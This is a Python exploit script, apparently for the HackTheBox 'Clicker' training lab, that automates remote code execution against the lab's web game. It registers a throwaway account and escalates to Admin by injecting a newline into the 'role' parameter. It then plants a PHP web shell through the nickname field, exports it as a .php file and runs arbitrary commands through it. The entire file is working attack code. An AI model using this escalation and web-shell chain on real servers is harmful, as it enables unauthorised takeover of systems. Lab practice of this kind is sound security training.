#!/usr/bin/python3
#Very basic script for RCE for HTB Clicker lab, since the box randomly nuked accounts which became tedious after a hot second.

import requests
import re
import string
import secrets
import sys

#Generate creds

Username = ''.join(secrets.choice(string.ascii_lowercase) for i in range(8))
Password = ''.join(secrets.choice(string.ascii_lowercase) for i in range(8))
url = "http://clicker.htb"

if len(sys.argv) > 2:
    print("./exploit <cmd>")
    exit()
elif len(sys.argv) == 1:
    print("./exploit <cmd>")
    exit()
else:
    payload = sys.argv[1]    

#Register

s = requests.Session()
body = {"username":Username,"password":Password}
s.post(url + '/create_player.php', data=body, allow_redirects=True)

#Login

body = {"username":Username,"password":Password}
s.post(url + '/authenticate.php', data=body, allow_redirects=True)

#role assignment and php payload

s.get(url + '/save_game.php' + "?role%0a=Admin&nickname=<%3fphp+system($_GET['cmd'])+%3f>", allow_redirects=True, )

#Update Session values

s.post(url + '/logout.php', allow_redirects=True)
body = {"username":Username,"password":Password}
s.post(url + '/authenticate.php', data=body, allow_redirects=True)

#export
body = {"threshold":"1000000","extension":"php"}
r = s.post(url + '/export.php', data=body, allow_redirects=False)
location_header = r.headers['Location']
pattern = r'exports/([\w]+)\.php$'
match = re.search(pattern, location_header)
export_link = match.group(1)

#RCE
r = s.get(url + '/exports/' + export_link + '.php?cmd=' + payload, allow_redirects=True)
content = r.content.decode('utf-8')
pattern = r'<th scope="row">(.*?)\s*</th>'
match = re.search(pattern, content, re.DOTALL)
RCE_stdout = match.group(1).strip()
print(RCE_stdout)